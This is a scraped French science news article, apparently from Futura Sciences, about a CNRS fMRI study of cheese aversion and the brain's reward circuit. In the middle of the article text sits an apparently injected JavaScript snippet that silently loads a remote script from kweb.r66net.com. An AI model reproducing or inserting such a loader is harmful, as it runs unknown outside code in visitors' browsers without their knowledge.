{"title": "Cerveau : pourquoi certains n'aiment-ils pas le fromage ?", "newspaper": "Futura Sciences", "author": ["CNRS"], "date_publi": "2016-10-18", "content": "Les prix IgNobel 2017 viennent d'etre decernes. Parmi les laureats de ce concours des recherches << qui font rire puis reflechir >> figurent des chercheurs francais du CNRS recompenses pour une etrange etude sur le cerveau et le fromage. Comme nous le rapportions en 2016, pour avoir bien senti qu'il se passait quelque chose, ces scientifiques ont decrypte les processus cerebraux qui expliqueraient pourquoi certaines personnes detestent tant le fromage.  Article du CNRS paru le 18 octobre 2016 Difficile d'etre tiede face a un munster ou un epoisses : on adore ou cela nous degoute. La France a beau etre le pays qui compte le plus grand nombre de varietes de  fromages  (pres de 1.600), nombreuses sont les personnes qui sont rebutees par cet aliment. Or l'aversion est un element extremement puissant dans le monde animal : elle represente un element cle de la survie, d'ou l'interet d'etudier les mecanismes cerebraux a l'oeuvre. Pourquoi le fromage ? Car il semblait aux chercheurs que nombre de personnes n'aimaient pas ce type de laitage. Des chercheurs du Centre de recherche en neuroscience de Lyon (CNRS/Inserm/Universite  Claude Bernard  Lyon 1/Universite Jean Monnet) et du laboratoire Neuroscience Paris Seine (CNRS/Inserm/UPMC) ont donc effectue une etude sur un echantillon de 332 personnes afin de verifier leur intuition : le fromage est bien l'aliment pour lequel l'aversion est la plus frequente. Elle concerne 6 % des personnes interrogees alors que l'aversion pour le  poisson  ne concerne que 2,7 % des personnes testees et celles pour la charcuterie 2,4 %. Parmi les personnes aversives au fromage, 18 % se disent intolerantes au  lactose  et dans 47 % des cas, au moins un des membres de leur famille n'aime pas non plus le fromage. Ces chiffres suggerent une origine  genetique  de cette aversion, qui pourrait par exemple etre liee a l' intolerance  au lactose. Pour etudier ce qu'il se passe dans le  cerveau , quinze personnes  aimant  le fromage et quinze autres ne l'appreciant pas ont ensuite ete selectionnees et ont participe a une etude d' imagerie par resonance magnetique  fonctionnelle ( IRMf ). Elles ont ainsi ete confrontees simultanement a l'image et l'odeur de six fromages differents et de six autres types d'aliments temoins. Elles devaient affirmer si elles appreciaient ou pas l'odeur et la vue de ces aliments, puis si, a ce moment precis, elles avaient envie de les manger. Chez les personnes qui n'aiment pas le fromage, l'odeur et/ou la vue de cet aliment ne stimulent pas une region du cerveau pourtant activee quand on a faim. (c) Alliance, Shutterstock                               Le circuit de la recompense implique dans le degout du fromage Les chercheurs ont alors observe que le pallidum ventral, une petite structure habituellement activee chez des personnes qui ont  faim , etait totalement inactive lors de la presentation d'une odeur et d'une image de fromage chez les personnes aversives au fromage alors qu'elle etait activee par tous les autres types d'aliments.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Plus etonnant, les chercheurs ont constate que des  aires cerebrales , le globus pallidus et la substantia nigra, qui participent au  circuit de la recompense  (activees quand on adore quelque chose), etaient plus impliquees chez les personnes qui detestent le fromage que chez celles qui l'apprecient. Il semble donc que ces structures classiquement impliquees dans le traitement de la recompense, sont aussi sollicitees en reponse a un stimulus aversif. Pour expliquer cette dualite, les chercheurs suggerent que ces regions comprennent deux types de  neurones  avec des activites complementaires : l'une liee au caractere recompensant d'un aliment, l'autre a son caractere aversif. Ces travaux,  publies sur le site de  Frontiers in Human Neuroscience , levent donc un coin du voile sur les aires cerebrales activees par la perception d'un  aliment  aversif et conduisent a penser que le circuit de la recompense peut aussi encoder le degout. Hoap-3, le robot cuisinier                       Hoap-3, un petit robot humanoide, peut cuisiner des omelettes au jambon et au fromage.                                       Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  pourquoi chiens aiment pas chats  |  lecteur dvd ne lit pas certains dvd  |  pas acces certains sites  |  tpe fromage  |  probleme de connexion certains sites  |  acariens dans fromage", "theme": "sante"}